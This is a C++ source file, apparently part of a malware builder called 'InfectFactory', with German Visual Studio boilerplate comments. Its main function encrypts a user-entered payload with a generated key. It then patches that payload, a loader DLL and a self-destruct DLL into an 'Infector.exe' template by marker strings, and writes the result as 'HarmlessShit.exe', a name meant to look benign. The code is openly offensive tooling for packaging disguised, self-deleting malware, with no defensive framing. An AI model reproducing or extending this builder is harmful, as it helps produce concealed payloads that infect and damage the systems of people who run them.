// InfectFactory.cpp : Diese Datei enthält die Funktion "main". Hier beginnt und endet die Ausführung des Programms.
//
#include <Windows.h>
#include <iostream>
#include "algorithms.hpp"
#include "crypt.hpp"
#include "dir.hpp"
using namespace std;
int main()
{
    string key = gen_key();
    string payload;
    cout << "Insert payload here: ";
    cin >> payload;
    cout << endl;
    string enc_payload = encrypt(payload, 1024, key);
    vector<unsigned char> loader = ReadBinary("./Templates/LoaderDLL.dll");
    vector<unsigned char> SelfDst = ReadBinary("./Templates/SelfDestDLL.dll");
    vector<unsigned char> Infector = ReadBinary("./Templates/Infector.exe");
    cout << "Read Binaries..."<<endl;
    FindAndReplaceVectorByMarker(loader, key, false, "__MaRK_kEy");
    FindAndReplaceVectorWithVectorByMarker(Infector, loader, true, "_MaRkeR__lOaDEr__");
    FindAndReplaceVectorWithVectorByMarker(Infector, SelfDst, true, "__MarKeRR_SLfDsT_");
    FindAndReplaceVectorByMarker(Infector, enc_payload, true, "MaRkEEr_PaYloAd");
    cout << "Replaced Vectors..." << endl;
    WriteBinary("./out/HarmlessShit.exe", Infector);
}

// Programm ausführen: STRG+F5 oder Menüeintrag "Debuggen" > "Starten ohne Debuggen starten"
// Programm debuggen: F5 oder "Debuggen" > Menü "Debuggen starten"

// Tipps für den Einstieg: 
//   1. Verwenden Sie das Projektmappen-Explorer-Fenster zum Hinzufügen/Verwalten von Dateien.
//   2. Verwenden Sie das Team Explorer-Fenster zum Herstellen einer Verbindung mit der Quellcodeverwaltung.
//   3. Verwenden Sie das Ausgabefenster, um die Buildausgabe und andere Nachrichten anzuzeigen.
//   4. Verwenden Sie das Fenster "Fehlerliste", um Fehler anzuzeigen.
//   5. Wechseln Sie zu "Projekt" > "Neues Element hinzufügen", um neue Codedateien zu erstellen, bzw. zu "Projekt" > "Vorhandenes Element hinzufügen", um dem Projekt vorhandene Codedateien hinzuzufügen.
//   6. Um dieses Projekt später erneut zu öffnen, wechseln Sie zu "Datei" > "Öffnen" > "Projekt", und wählen Sie die SLN-Datei aus.
